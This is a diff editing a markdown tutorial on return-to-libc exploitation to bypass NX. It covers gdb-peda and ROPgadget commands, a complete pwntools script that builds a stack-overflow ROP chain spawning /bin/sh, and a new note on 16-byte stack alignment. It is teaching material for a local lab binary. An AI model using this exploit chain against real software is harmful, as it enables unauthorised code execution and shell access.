@@ -11,9 +11,9 @@ With NX bit turned on, our classic approach to stack based buffer overflow will 
 - By `default` when compiling C program NX bit is enabled.
 - To disable it use command
 
-``````bash
-gcc -z execstack program.c 
-```````
+```bash
+gcc -z execstack program.c
+```
 
 ### Return to Libc attack (Bypass NX)
 
@@ -39,7 +39,6 @@ After the returning from the greet_me function the stack must look like bellow:
 
 ![Stack](https://miro.medium.com/v2/resize:fit:640/format:webp/1*jo-61Wu9G11Xht7l7PGPJg.png)
 
-
 1. Place adequate data to overflow the buffer and overwrite the `$rbp` register
 
 2. Overwrite the `RIP` register in order to point to a `POP RDI` instruction followed by a `RET`, this way what ever is on top of the stack (in our case it will be the `“/bin/sh”` string) will be passed to the RDI register and the RET will pop the stack placing the next instruction address to the RIP register→3.
@@ -48,7 +47,7 @@ After the returning from the greet_me function the stack must look like bellow:
 
 4. When the system() function returns, the RIP register will point to the exit() function, in order to exit our program cleanly.
 
-### Vulnerable Program 
+### Vulnerable Program
 
 ---
 
@@ -65,7 +64,7 @@ gcc -fno-stack-protector -no-pie -D_FORTIFY_SOURCE=0 program.c -o program
 Use following command in gdb to locate `libc` loaded address in the program.
 
 ```bash
-$gdb-peda vmmap
+gdb-peda$ vmmap
 ```
 
 ```bash
@@ -73,7 +72,7 @@ ldd programexecutable
 ```
 
 ```bash
-$gdb-peda info proc map
+gdb-peda$ info proc map
 ```
 
 #### Locate a the gadget (in libc)
@@ -81,10 +80,10 @@ $gdb-peda info proc map
 To get the pop rdi instruction we can use many tools to get the gadgets from the libc
 
 ```bash
-ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"
+ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
 ```
 
-- You can get /bin/sh address using the following commands. The address given by the command will be relative address to libc_base address.Use `(libc_base+/bin/sh)` to get the proper /bin/sh address.
+- You can get `/bin/sh` address using the following commands. The address given by the command will be relative address to libc_base address.Use `(libc_base+/bin/sh)` to get the proper /bin/sh address.
 
 ```bash
 strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
@@ -97,7 +96,7 @@ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
 ```
 
 ```bash
-$gdb-peda x system
+gdb-peda$ x system
 ```
 
 ### Final Exploit
@@ -108,7 +107,7 @@ from pwn import *
 libc_base = 0x00007ffff7c00000
 padding  = b"A"*24
 #ret      = struct.pack("<Q", libc_base+0x40101a)   # stack alignment
-ret      = p64(libc_base+0x40101a)                  
+ret      = p64(libc_base+0x40101a)
 #poprdi   = struct.pack("<Q", libc_base+0x28715)    # pop rdi
 poprdi   = p64(libc_base+0x28715)
 #binsh    = struct.pack("<Q", libc_base+0x1c041b)   # /bin/sh
@@ -116,11 +115,21 @@ binsh    = p64(libc_base+0x1c041b)
 #system   = struct.pack("<Q", 0x7ffff7c55230)       # absolute system address
 system   = p64(0x7ffff7c55230)
 #exitfunc = struct.pack("<Q", 0x7ffff7c45240)       # exit function absolute address
-exitfunc = p64(0x7ffff7c45240) 
+exitfunc = p64(0x7ffff7c45240)
 exploit = padding+ret+poprdi+binsh+system+exitfunc
 file = open('exp', 'wb')
 file.write(exploit)
 ```
+
+### 16-Bytes Stack Alignment
+
+The 64 bit calling convention requires the stack to be `16-byte aligned` before a call instruction but this is easily `violated during ROP` chain execution, causing all further calls from that function to be made with a misaligned stack. `movaps` triggers a general protection `fault` when operating on `unaligned` data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a `push instruction`. We can find an extra RET instruction address in the libc file, following exactly the process we did in the POP RDI, RET gadget.
+
+```py
+ret      = p64(libc_base+0x40101a)
+```
+
+So one more ret instruciton is added to ake stack aligned. Running the vulnerable program using the output produced by the script above we finally get the shell.
 
 ## Additional Links
 
